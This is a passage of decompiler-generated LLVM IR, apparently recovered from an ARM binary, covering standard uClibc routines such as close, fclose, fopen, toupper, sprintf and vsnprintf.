  store i32 %v2_120fc, i32* @r7, align 4
  ret i32 %v0_120f8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120f8, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12104 = load i32, i32* @r7, align 4
  store i32 %v3_12104, i32* %stack_var_-8, align 4
  %v0_12110 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12110, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12110, -4095
  br i1 %tmp, label %dec_label_pc_12130, label %dec_label_pc_12120

dec_label_pc_12120:                               ; preds = %entry
  %v0_12120 = call i32 @__GI___errno_location()
  %v0_12124 = load i32, i32* %r7.global-to-local, align 4
  %v1_12124 = sub i32 0, %v0_12124
  %v2_12128 = inttoptr i32 %v0_12120 to i32*
  store i32 %v1_12124, i32* %v2_12128, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12130.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12130

dec_label_pc_12130:                               ; preds = %entry, %dec_label_pc_12120
  %v1_12134 = phi i32 [ %v0_12110, %entry ], [ -1, %dec_label_pc_12120 ]
  %v2_12130 = phi i32 [ %v3_12104, %entry ], [ %v2_12130.pre, %dec_label_pc_12120 ]
  store i32 %v2_12130, i32* @r7, align 4
  ret i32 %v1_12134

; uselistorder directives
  uselistorder i32 %v0_12110, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12130, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_12144 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 744) to i32*), align 4
  %v2_12148 = mul i32 %arg1, 2
  %v2_1214c = add i32 %v4_12144, %v2_12148
  %v3_1214c = inttoptr i32 %v2_1214c to i16*
  %v4_1214c = load i16, i16* %v3_1214c, align 2
  %v6_1214c = zext i16 %v4_1214c to i32
  %v1_12150 = and i32 %v6_1214c, 32
  ret i32 %v1_12150
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_12164 = add i32 %arg1, 128
  %v2_12168 = icmp ugt i32 %v1_12164, 383
  %v0_12170 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12168, i32 %v0_12170)
  %v4_12178 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 752) to i32*), align 4
  %v2_1217c = mul i32 %arg1, 2
  %v2_12180 = add i32 %v4_12178, %v2_1217c
  %v3_12180 = inttoptr i32 %v2_12180 to i16*
  %v4_12180 = load i16, i16* %v3_12180, align 2
  %v6_12180 = sext i16 %v4_12180 to i32
  ret i32 %v6_12180
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 26512)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_121ac = load i32, i32* @r4, align 4
  store i32 %v3_121ac, i32* %stack_var_-36, align 4
  %v6_121ac = load i32, i32* @r5, align 4
  %v9_121ac = load i32, i32* @r6, align 4
  %v12_121ac = load i32, i32* @r7, align 4
  %v15_121ac = load i32, i32* @r8, align 4
  %v27_121ac = load i32, i32* @lr, align 4
  %v2_121b0 = add i32 %tmp, 52
  %v3_121b0 = inttoptr i32 %v2_121b0 to i32*
  %v4_121b0 = load i32, i32* %v3_121b0, align 4
  %v1_121b8 = sub i32 1, %v4_121b0
  %v2_121b8 = icmp ult i32 %v4_121b0, 2
  br i1 %v2_121b8, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_121b8, %entry ]
  %v0_121c0 = phi i32 [ 0, %bb ], [ %v1_121b8, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_121c0 = icmp eq i32 %v0_121c0, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r6, align 4
  br i1 %v2_121c0, label %dec_label_pc_1220c, label %dec_label_pc_121d4

dec_label_pc_121d4:                               ; preds = %thread-pre-split
  %v4_121ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_121ec)
  %v0_12200 = load i32, i32* @r6, align 4
  %v2_12200 = add i32 %v0_12200, 20
  %v3_12200 = inttoptr i32 %v2_12200 to i32*
  %v4_12200 = load i32, i32* %v3_12200, align 4
  call void @__pseudo_branch(i32 %v4_12200)
  %v0_1220c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %thread-pre-split, %dec_label_pc_121d4
  %v1_12214 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_1220c.pre, %dec_label_pc_121d4 ]
  %v1_1220c = inttoptr i32 %v1_12214 to i16*
  %v2_1220c = load i16, i16* %v1_1220c, align 2
  %v3_1220c = zext i16 %v2_1220c to i32
  %v1_12210 = and i32 %v3_1220c, 64
  %v2_12210 = icmp eq i32 %v1_12210, 0
  br i1 %v2_12210, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_1220c
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1220c, %bb17
  %storemerge24 = phi i32 [ %v1_12214, %bb17 ], [ %v1_12210, %dec_label_pc_1220c ]
  %v1_12218 = xor i1 %v2_12210, true
  call void @__pseudo_cond_branch(i1 %v1_12218, i32 ptrtoint (i32* @global_var_13df4.992 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_12220 = load i32, i32* @r5, align 4
  %v1_12220 = add i32 %v0_12220, 4
  %v2_12220 = inttoptr i32 %v1_12220 to i32*
  %v3_12220 = load i32, i32* %v2_12220, align 4
  %v1_12224 = call i32 @__GI_close(i32 %v3_12220)
  %v0_1222c = load i32, i32* @r6, align 4
  %v2_12238 = add i32 %v0_1222c, 116
  %v3_12238 = inttoptr i32 %v2_12238 to i32*
  %v4_12238 = load i32, i32* %v3_12238, align 4
  store i32 %v4_12238, i32* @r7, align 4
  %v1_12240 = load i32, i32* @r5, align 4
  %v2_12240 = add i32 %v1_12240, 4
  %v3_12240 = inttoptr i32 %v2_12240 to i32*
  store i32 -1, i32* %v3_12240, align 4
  %v0_12248 = load i32, i32* @r6, align 4
  %v2_12248 = add i32 %v0_12248, 80
  %v3_12248 = inttoptr i32 %v2_12248 to i32*
  %v4_12248 = load i32, i32* %v3_12248, align 4
  %v1_12250 = icmp slt i32 %v1_12224, 0
  store i32 %v4_12248, i32* %stack_var_-80, align 4
  br i1 %v1_12250, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_12248)
  %v0_12278 = load i32, i32* @r6, align 4
  %v2_12278 = add i32 %v0_12278, 20
  %v3_12278 = inttoptr i32 %v2_12278 to i32*
  %v4_12278 = load i32, i32* %v3_12278, align 4
  call void @__pseudo_branch(i32 %v4_12278)
  %v0_12288 = load i32, i32* @r6, align 4
  %v2_12288 = add i32 %v0_12288, 12
  %v3_12288 = inttoptr i32 %v2_12288 to i32*
  %v4_12288 = load i32, i32* %v3_12288, align 4
  %v1_1228c = inttoptr i32 %v4_12288 to i32*
  %v2_1228c = load i32, i32* %v1_1228c, align 4
  %v1_12294 = add i32 %v2_1228c, 1
  %v2_12298 = add i32 %v0_12288, 28
  %v3_12298 = inttoptr i32 %v2_12298 to i32*
  %v4_12298 = load i32, i32* %v3_12298, align 4
  store i32 %v4_12298, i32* @r4, align 4
  store i32 %v1_12294, i32* %v1_1228c, align 4
  call void @__pseudo_branch(i32 %v4_12298)
  %v0_122b0 = load i32, i32* @r5, align 4
  %v1_122b0 = inttoptr i32 %v0_122b0 to i16*
  %v2_122b0 = load i16, i16* %v1_122b0, align 2
  %v1_122b4 = and i16 %v2_122b0, 24576
  %v1_122b8 = or i16 %v1_122b4, 48
  %v0_122bc = load i32, i32* %sb.global-to-local, align 4
  %v2_122bc = icmp eq i32 %v0_122bc, 0
  store i16 %v1_122b8, i16* %v1_122b0, align 2
  br i1 %v2_122bc, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_122d0 = xor i1 %v2_122bc, true
  call void @__pseudo_cond_branch(i1 %v2_122d0, i32 %v4_12298)
  %v0_122d4 = load i32, i32* @r5, align 4
  %v1_122d4 = inttoptr i32 %v0_122d4 to i16*
  %v2_122d4 = load i16, i16* %v1_122d4, align 2
  %v1_122d8 = and i16 %v2_122d4, 16384
  %v2_122d8 = icmp eq i16 %v1_122d8, 0
  br i1 %v2_122d8, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_122e0 = xor i1 %v2_122d8, true
  call void @__pseudo_cond_branch(i1 %v1_122e0, i32 ptrtoint (i32* @global_var_15e54.996 to i32))
  %v2_122ec = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_122ec)
  call void @__pseudo_branch(i32 %v4_12278)
  %v0_1230c = load i32, i32* @r6, align 4
  %v2_1230c = add i32 %v0_1230c, 56
  %v3_1230c = inttoptr i32 %v2_1230c to i32*
  %v4_1230c = load i32, i32* %v3_1230c, align 4
  %v1_12310 = inttoptr i32 %v4_1230c to i32*
  %v2_12310 = load i32, i32* %v1_12310, align 4
  %v1_12314 = add i32 %v2_12310, 1
  store i32 %v1_12314, i32* %v1_12310, align 4
  call void @__pseudo_branch(i32 %v4_12298)
  %v0_1232c = call i32 @_stdio_openlist_dec_use()
  %v0_12330 = load i32, i32* %sl.global-to-local, align 4
  %v2_12338 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12338, i32* @r4, align 4
  store i32 %v6_121ac, i32* @r5, align 4
  store i32 %v9_121ac, i32* @r6, align 4
  store i32 %v12_121ac, i32* @r7, align 4
  store i32 %v15_121ac, i32* @r8, align 4
  store i32 %v27_121ac, i32* @lr, align 4
  ret i32 %v0_12330

; uselistorder directives
  uselistorder i1 %v2_122d8, { 1, 0 }
  uselistorder i32 %v4_12298, { 0, 2, 1, 3 }
  uselistorder i32 %v1_121b8, { 1, 0 }
  uselistorder i32 %v4_121b0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_1220c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_12344(i32 %arg1) local_unnamed_addr {
dec_label_pc_12344:
  %v0_12344 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12344, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_12344
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_12344, %bb
  %v10_1235c = phi i32 [ %arg1, %dec_label_pc_12344 ], [ 0, %bb ]
  ret i32 %v10_1235c

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_12370 = call i32 @_stdio_fopen()
  ret i32 %v0_12370
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_123d8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_123d8, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_123ec = call i32 @__GI_vsnprintf()
  ret i32 %v0_123ec

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_12400 = load i32, i32* @r4, align 4
  %v6_12400 = load i32, i32* @r5, align 4
  %v9_12400 = load i32, i32* @r6, align 4
  %v12_12400 = load i32, i32* @r7, align 4
  %v18_12400 = load i32, i32* @sl, align 4
  %v2_12408 = ptrtoint i32* %stack_var_-112 to i32
  %v0_1240c = load i32, i32* @r0, align 4
  store i32 %v0_1240c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_12414 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12414, i32* @r0, align 4
  %v0_1241c = load i32, i32* @r3, align 4
  store i32 %v0_1241c, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_12428 = load i32, i32* @r1, align 4
  store i32 %v0_12428, i32* @r5, align 4
  %v0_1242c = load i32, i32* @r2, align 4
  store i32 %v0_1242c, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_12440 = call i32 @__stdio_init_mutex(i32 %v2_12414)
  %v0_12444 = load i32, i32* @r4, align 4
  %v1_12444 = sub i32 -1, %v0_12444
  %v0_12448 = load i32, i32* @r5, align 4
  %v3_12448 = icmp ult i32 %v0_12448, %v1_12444
  br i1 %v3_12448, label %bb24, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_12444, i32* @r5, align 4
  br label %bb24

bb24:                                             ; preds = %entry, %bb
  %v1_12450 = phi i32 [ %v0_12448, %entry ], [ %v1_12444, %bb ]
  %v0_12458 = load i32, i32* @r6, align 4
  %v0_1245c = load i32, i32* @r7, align 4
  %v3_1247c = inttoptr i32 %v0_12458 to i8*
  %v4_1247c = call i32 @_vfprintf_internal(i32 %v2_12408, i8* %v3_1247c, i32 %v0_1245c)
  %v0_12480 = load i32, i32* @r5, align 4
  %v1_12480 = load i32, i32* @sl, align 4
  %v9_12480 = icmp eq i32 %v0_12480, %v1_12480
  br i1 %v9_12480, label %dec_label_pc_124a8, label %dec_label_pc_1248c

dec_label_pc_1248c:                               ; preds = %bb24
  %v2_12450 = add i32 %v1_12450, %v0_12444
  %v9_12494 = icmp eq i32 %v1_12450, 0
  br i1 %v9_12494, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1248c
  %v2_12498 = add i32 %v0_12444, -1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1248c, %bb25
  %v1_1249c = phi i32 [ %v2_12450, %dec_label_pc_1248c ], [ %v2_12498, %bb25 ]
  %v1_1249c.v0_12474 = select i1 %v9_12494, i32 %v1_1249c, i32 %v0_12444
  %stack_var_-96.0 = inttoptr i32 %v1_1249c.v0_12474 to i8*
  %v1_124a4 = trunc i32 %v1_12480 to i8
  store i8 %v1_124a4, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_124a8

dec_label_pc_124a8:                               ; preds = %bb24, %bb26
  store i32 %v3_12400, i32* @r4, align 4
  store i32 %v6_12400, i32* @r5, align 4
  store i32 %v9_12400, i32* @r6, align 4
  store i32 %v12_12400, i32* @r7, align 4
  store i32 %v18_12400, i32* @sl, align 4
  ret i32 %v4_1247c

; uselistorder directives
  uselistorder i1 %v9_12494, { 1, 0 }
  uselistorder i32 %v1_12450, { 1, 0 }
  uselistorder i32 %v1_12444, { 2, 1, 0 }
  uselistorder i32 %v0_12444, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_124a8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_124b4 = load i32, i32* @r4, align 4
  store i32 %v3_124b4, i32* %stack_var_-36, align 4
  %v6_124b4 = load i32, i32* @r5, align 4
  %v9_124b4 = load i32, i32* @r6, align 4
  %v18_124b4 = load i32, i32* @sb, align 4
  %v24_124b4 = load i32, i32* @fp, align 4
  %v0_124b8 = load i32, i32* @r1, align 4
  %v1_124b8 = inttoptr i32 %v0_124b8 to i8*
  %v2_124b8 = load i8, i8* %v1_124b8, align 1
  %v3_124b8 = zext i8 %v2_124b8 to i32
  store i32 %v3_124b8, i32* @ip, align 4
  %v7_124c0 = icmp eq i8 %v2_124b8, 114
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @fp, align 4
  %v2_124c8 = ptrtoint i32* %stack_var_-72 to i32
  %v0_124cc = load i32, i32* @r0, align 4
  store i32 %v0_124cc, i32* @r6, align 4
  %v0_124d0 = load i32, i32* @r2, align 4
  store i32 %v0_124d0, i32* @sb, align 4
  %v0_124d4 = load i32, i32* @r3, align 4
  store i32 %v0_124d4, i32* @r5, align 4
  br i1 %v7_124c0, label %dec_label_pc_12520, label %dec_label_pc_124dc

dec_label_pc_124dc:                               ; preds = %entry
  %v7_124dc = icmp eq i8 %v2_124b8, 119
  br i1 %v7_124dc, label %bb, label %dec_label_pc_124e8

bb:                                               ; preds = %dec_label_pc_124dc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_12524

dec_label_pc_124e8:                               ; preds = %dec_label_pc_124dc
  %v7_124e8 = icmp eq i8 %v2_124b8, 97
  br i1 %v7_124e8, label %bb34, label %dec_label_pc_124f4

bb34:                                             ; preds = %dec_label_pc_124e8
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_12524

dec_label_pc_124f4:                               ; preds = %dec_label_pc_124e8, %dec_label_pc_125a8, %dec_label_pc_1257c
  %v0_124f4 = call i32 @__GI___errno_location()
  store i32 %v0_124f4, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_124fc = load i32, i32* @sb, align 4
  %v2_124fc = icmp eq i32 %v0_124fc, 0
  %v2_12500 = inttoptr i32 %v0_124f4 to i32*
  store i32 22, i32* %v2_12500, align 4
  br i1 %v2_124fc, label %dec_label_pc_12774, label %dec_label_pc_12508

dec_label_pc_12508:                               ; preds = %dec_label_pc_125cc._crit_edge, %dec_label_pc_124f4
  %v0_12508 = load i32, i32* @sb, align 4
  %v1_12508 = inttoptr i32 %v0_12508 to i16*
  %v2_12508 = load i16, i16* %v1_12508, align 2
  %v3_12508 = zext i16 %v2_12508 to i32
  store i32 %v3_12508, i32* %r3.global-to-local, align 4
  %v1_1250c = and i32 %v3_12508, 8192
  %v2_1250c = icmp eq i32 %v1_1250c, 0
  br i1 %v2_1250c, label %dec_label_pc_12774, label %dec_label_pc_12514

dec_label_pc_12514:                               ; preds = %dec_label_pc_12508
  store i32 %v0_12508, i32* @r0, align 4
  %v0_12518 = call i32 @free()
  store i32 %v0_12518, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12774

dec_label_pc_12520:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12524

dec_label_pc_12524:                               ; preds = %bb, %bb34, %dec_label_pc_12520
  %v1_1253c = phi i32 [ 1089, %bb34 ], [ 577, %bb ], [ 1, %dec_label_pc_12520 ]
  %v1_12524 = add i32 %v0_124b8, 1
  %v2_12524 = inttoptr i32 %v1_12524 to i8*
  %v3_12524 = load i8, i8* %v2_12524, align 1
  %v7_12528 = icmp eq i8 %v3_12524, 98
  %v1_12524.v0_124b8 = select i1 %v7_12528, i32 %v1_12524, i32 %v0_124b8
  store i32 %v1_12524.v0_124b8, i32* %r3.global-to-local, align 4
  %v1_12534 = add i32 %v1_12524.v0_124b8, 1
  %v2_12534 = inttoptr i32 %v1_12534 to i8*
  %v3_12534 = load i8, i8* %v2_12534, align 1
  %v4_12534 = zext i8 %v3_12534 to i32
  store i32 %v4_12534, i32* @r3, align 4
  %v7_12538 = icmp eq i8 %v3_12534, 43
  br i1 %v7_12538, label %bb37, label %.thread5

bb37:                                             ; preds = %dec_label_pc_12524
  store i32 %v1_1253c, i32* @r3, align 4
  %v2_12540 = add nuw nsw i32 %v1_1253c, 1
  store i32 %v2_12540, i32* @r4, align 4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_12524, %bb37
  %v2_12544 = icmp eq i32 %v0_124d0, 0
  br i1 %v2_12544, label %dec_label_pc_1254c, label %dec_label_pc_12574

dec_label_pc_1254c:                               ; preds = %.thread5
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_12550 = call i32 @malloc(i32 80)
  store i32 %v1_12550, i32* %r0.global-to-local, align 4
  store i32 %v1_12550, i32* @sb, align 4
  %v3_12554 = icmp eq i32 %v1_12550, 0
  br i1 %v3_12554, label %dec_label_pc_12778, label %dec_label_pc_1255c

dec_label_pc_1255c:                               ; preds = %dec_label_pc_1254c
  %v2_12560 = add i32 %v1_12550, 8
  %v3_12560 = inttoptr i32 %v2_12560 to i32*
  store i32 0, i32* %v3_12560, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_12568 = load i32, i32* @sb, align 4
  %v3_12568 = inttoptr i32 %v2_12568 to i16*
  store i16 8192, i16* %v3_12568, align 2
  %v0_1256c = load i32, i32* @sb, align 4
  %v1_1256c = add i32 %v0_1256c, 56
  store i32 %v1_1256c, i32* @r0, align 4
  %v1_12570 = call i32 @__stdio_init_mutex(i32 %v1_1256c)
  store i32 %v1_12570, i32* %r0.global-to-local, align 4
  %v0_12574.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12574

dec_label_pc_12574:                               ; preds = %.thread5, %dec_label_pc_1255c
  %v0_125cc = phi i32 [ %v0_124d4, %.thread5 ], [ %v0_12574.pre, %dec_label_pc_1255c ]
  %v1_12574 = icmp slt i32 %v0_125cc, 0
  br i1 %v1_12574, label %dec_label_pc_125cc, label %dec_label_pc_1257c

dec_label_pc_1257c:                               ; preds = %dec_label_pc_12574
  %v0_12580 = load i32, i32* @r4, align 4
  %v2_12580 = and i32 %v0_12580, ptrtoint ([13 x i8]* @global_var_20003.1002 to i32)
  %v1_12584 = add i32 %v2_12580, 1
  store i32 %v1_12584, i32* %r2.global-to-local, align 4
  %v0_12588 = load i32, i32* @r6, align 4
  %v1_12588 = add i32 %v0_12588, 1
  %v2_1258c = and i32 %v1_12588, %v1_12584
  store i32 %v2_1258c, i32* %r3.global-to-local, align 4
  %v9_12590 = icmp eq i32 %v2_1258c, %v1_12584
  %v1_12594 = load i32, i32* @sb, align 4
  %v2_12594 = add i32 %v1_12594, 4
  %v3_12594 = inttoptr i32 %v2_12594 to i32*
  store i32 %v0_125cc, i32* %v3_12594, align 4
  br i1 %v9_12590, label %dec_label_pc_1259c, label %dec_label_pc_124f4

dec_label_pc_1259c:                               ; preds = %dec_label_pc_1257c
  %v0_1259c = load i32, i32* @r4, align 4
  %v1_1259c = load i32, i32* @r6, align 4
  %v2_1259c = sub i32 -1, %v1_1259c
  %v3_1259c = and i32 %v0_1259c, %v2_1259c
  store i32 %v3_1259c, i32* @r3, align 4
  %v1_125a0 = and i32 %v3_1259c, 1024
  %v2_125a0 = icmp eq i32 %v1_125a0, 0
  br i1 %v2_125a0, label %dec_label_pc_125c0, label %dec_label_pc_125a8

dec_label_pc_125a8:                               ; preds = %dec_label_pc_1259c
  %v0_125a8 = load i32, i32* @r5, align 4
  store i32 %v0_125a8, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_125b4 = call i32 @__libc_fcntl(i32 %v0_125a8, i32 4)
  store i32 %v2_125b4, i32* %r0.global-to-local, align 4
  %v2_125b8 = icmp eq i32 %v2_125b4, 0
  br i1 %v2_125b8, label %dec_label_pc_125a8.dec_label_pc_125c0_crit_edge, label %dec_label_pc_124f4

dec_label_pc_125a8.dec_label_pc_125c0_crit_edge:  ; preds = %dec_label_pc_125a8
  %v0_125c0.pre = load i32, i32* @r6, align 4
  %v0_125c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_125c0

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125a8.dec_label_pc_125c0_crit_edge, %dec_label_pc_1259c
  %v0_125c4 = phi i32 [ %v0_125c4.pre, %dec_label_pc_125a8.dec_label_pc_125c0_crit_edge ], [ %v0_1259c, %dec_label_pc_1259c ]
  %v0_125c0 = phi i32 [ %v0_125c0.pre, %dec_label_pc_125a8.dec_label_pc_125c0_crit_edge ], [ %v1_1259c, %dec_label_pc_1259c ]
  %v1_125c0 = and i32 %v0_125c0, 131072
  store i32 %v1_125c0, i32* %r3.global-to-local, align 4
  %v2_125c4 = or i32 %v1_125c0, %v0_125c4
  store i32 %v2_125c4, i32* @r4, align 4
  br label %dec_label_pc_125f0

dec_label_pc_125cc:                               ; preds = %dec_label_pc_12574
  %v7_125cc = icmp eq i32 %v0_125cc, -1
  %v0_125d8.pre = load i32, i32* @r4, align 4
  br i1 %v7_125cc, label %dec_label_pc_125cc._crit_edge, label %bb38

bb38:                                             ; preds = %dec_label_pc_125cc
  %v2_125d0 = or i32 %v0_125d8.pre, ptrtoint ([16 x i8]* @global_var_20000.1003 to i32)
  store i32 %v2_125d0, i32* @r4, align 4
  br label %dec_label_pc_125cc._crit_edge

dec_label_pc_125cc._crit_edge:                    ; preds = %dec_label_pc_125cc, %bb38
  %v0_125d8 = phi i32 [ %v2_125d0, %bb38 ], [ %v0_125d8.pre, %dec_label_pc_125cc ]
  %v0_125d4 = load i32, i32* @r6, align 4
  store i32 %v0_125d4, i32* %r0.global-to-local, align 4
  store i32 %v0_125d8, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_125e0 = call i32 @__GI_open(i32 %v0_125d4, i32 %v0_125d8)
  store i32 %v2_125e0, i32* %r0.global-to-local, align 4
  %v1_125e4 = icmp slt i32 %v2_125e0, 0
  %v1_125e8 = load i32, i32* @sb, align 4
  %v2_125e8 = add i32 %v1_125e8, 4
  %v3_125e8 = inttoptr i32 %v2_125e8 to i32*
  store i32 %v2_125e0, i32* %v3_125e8, align 4
  br i1 %v1_125e4, label %dec_label_pc_12508, label %.dec_label_pc_125f0_crit_edge

.dec_label_pc_125f0_crit_edge:                    ; preds = %dec_label_pc_125cc._crit_edge
  %v0_125f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_125f0

dec_label_pc_125f0:                               ; preds = %.dec_label_pc_125f0_crit_edge, %dec_label_pc_125c0
  %v0_1260c = phi i32 [ %v0_125f4.pre, %.dec_label_pc_125f0_crit_edge ], [ %v2_125c4, %dec_label_pc_125c0 ]
  %v0_125f0 = load i32, i32* @sb, align 4
  %v1_125f0 = inttoptr i32 %v0_125f0 to i16*
  %v2_125f0 = load i16, i16* %v1_125f0, align 2
  %v3_125f0 = zext i16 %v2_125f0 to i32
  %v1_125f4 = urem i32 %v0_1260c, 4
  %v1_125f8 = and i32 %v0_1260c, 1024
  %v1_125fc = and i32 %v3_125f0, 8192
  %v1_12600 = add nuw nsw i32 %v1_125f4, 1
  %v2_12604 = or i32 %v1_125fc, %v1_125f8
  store i32 %v2_12604, i32* %r3.global-to-local, align 4
  %v1_12608 = xor i32 %v1_12600, 3
  store i32 %v1_12608, i32* %r1.global-to-local, align 4
  %v1_1260c = and i32 %v0_1260c, ptrtoint ([16 x i8]* @global_var_20000.1003 to i32)
  store i32 %v1_1260c, i32* %r2.global-to-local, align 4
  %v2_1260c = icmp eq i32 %v1_1260c, 0
  %v1_12610 = add i32 %v0_125f0, 4
  %v2_12610 = inttoptr i32 %v1_12610 to i32*
  %v3_12610 = load i32, i32* %v2_12610, align 4
  store i32 %v3_12610, i32* @r5, align 4
  br i1 %v2_1260c, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_125f0
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_125f0, %bb39
  %v0_1261c = phi i32 [ 0, %dec_label_pc_125f0 ], [ 32768, %bb39 ]
  %v4_12618 = mul nuw nsw i32 %v1_12608, 16
  %v5_12618 = or i32 %v2_12604, %v4_12618
  store i32 %v5_12618, i32* %r3.global-to-local, align 4
  %v2_1261c = or i32 %v0_1261c, %v5_12618
  store i32 %v2_1261c, i32* %r2.global-to-local, align 4
  %v8_12620 = icmp eq i32 %v3_12610, 2147483647
  %v1_12624 = trunc i32 %v2_1261c to i16
  store i16 %v1_12624, i16* %v1_125f0, align 2
  br i1 %v8_12620, label %dec_label_pc_12654, label %dec_label_pc_1262c

dec_label_pc_1262c:                               ; preds = %bb40
  %v0_1262c = call i32 @__GI___errno_location()
  store i32 %v0_1262c, i32* @r4, align 4
  %v0_12634 = load i32, i32* @r5, align 4
